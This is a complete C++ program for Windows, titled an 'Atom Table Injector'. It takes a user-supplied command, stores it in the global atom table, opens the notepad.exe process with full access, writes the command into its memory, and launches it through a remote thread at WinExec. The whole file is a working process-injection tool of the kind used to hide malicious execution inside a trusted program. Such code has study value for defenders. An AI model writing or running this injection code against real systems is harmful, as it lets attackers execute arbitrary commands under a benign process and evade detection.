// Atom Table Injector: Prompt for command, retrieve, and inject into Notepad
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>

// Find Notepad process
DWORD FindNotepadPID() {
    PROCESSENTRY32 entry = { sizeof(PROCESSENTRY32) };
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, L"notepad.exe") == 0) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        } while (Process32Next(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return 0;
}

int main() {
    // Step 1: Prompt user for command
    std::string cmd;
    std::cout << "[?] Enter command to execute (e.g., cmd /c start calc.exe): ";
    std::getline(std::cin, cmd);

    if (cmd.empty()) {
        std::cerr << "[-] No command entered. Exiting." << std::endl;
        return 1;
    }

    // Step 2: Write command to Atom Table
    ATOM atom = AddAtomA(cmd.c_str());
    if (atom == 0) {
        std::cerr << "[-] AddAtomA failed: " << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "[+] Atom created with ID: 0x" << std::hex << atom << std::endl;

    // Step 3: Retrieve the command from Atom Table
    char atomBuffer[256] = { 0 };
    if (GetAtomNameA(atom, atomBuffer, sizeof(atomBuffer)) == 0) {
        std::cerr << "[-] GetAtomNameA failed: " << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "[+] Retrieved command from Atom: " << atomBuffer << std::endl;

    // Step 4: Find Notepad PID
    DWORD pid = FindNotepadPID();
    if (pid == 0) {
        std::cerr << "[-] Notepad not found. Please start Notepad first." << std::endl;
        return 1;
    }
    std::cout << "[+] Found Notepad PID: " << std::hex << pid << std::endl;

    // Step 5: Open Notepad process
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        std::cerr << "[-] Failed to open Notepad process: " << GetLastError() << std::endl;
        return 1;
    }

    // Step 6: Resolve WinExec
    FARPROC winexecFn = GetProcAddress(GetModuleHandleA("kernel32.dll"), "WinExec");
    if (!winexecFn) {
        std::cerr << "[-] Failed to resolve WinExec." << std::endl;
        CloseHandle(hProc);
        return 1;
    }

    // Step 7: Allocate memory in Notepad for Atom command
    SIZE_T len = strlen(atomBuffer) + 1;
    LPVOID remoteCmd = VirtualAllocEx(hProc, NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteCmd) {
        std::cerr << "[-] VirtualAllocEx failed: " << GetLastError() << std::endl;
        CloseHandle(hProc);
        return 1;
    }

    // Step 8: Write command into Notepad memory
    if (!WriteProcessMemory(hProc, remoteCmd, atomBuffer, len, NULL)) {
        std::cerr << "[-] WriteProcessMemory failed: " << GetLastError() << std::endl;
        VirtualFreeEx(hProc, remoteCmd, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 1;
    }

    // Step 9: Call WinExec in Notepad
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)winexecFn, remoteCmd, 0, NULL);
    if (!hThread) {
        std::cerr << "[-] CreateRemoteThread failed: " << GetLastError() << std::endl;
        VirtualFreeEx(hProc, remoteCmd, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 1;
    }

    std::cout << "[+] Command executed successfully from Notepad." << std::endl;

    // Cleanup
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
